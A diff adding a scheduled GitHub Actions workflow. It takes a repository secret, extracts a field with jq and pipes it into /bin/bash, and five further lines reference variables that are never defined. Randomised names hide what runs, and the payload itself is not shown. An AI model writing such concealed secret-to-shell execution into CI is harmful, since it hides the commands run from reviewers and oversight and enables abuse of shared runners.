@@ -1,0 +1,22 @@
+name: liutang19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liutang19871010
+        env:
+          zqkpq1362: ${{ secrets.zqkpq1362 }}
+        run: |
+          echo $zqkpq1362 | jq -r .kdogz0 | /bin/bash
+          echo $besq73 | jq -r .eez5407 | /bin/bash
+          echo $cwpct1 | jq -r .pqmt7096 | /bin/bash
+          echo $hax49905 | jq -r .vurjc9625 | /bin/bash
+          echo $jsr3714 | jq -r .c40 | /bin/bash
+          echo $zu6095 | jq -r .wgmqm9986 | /bin/bash
+
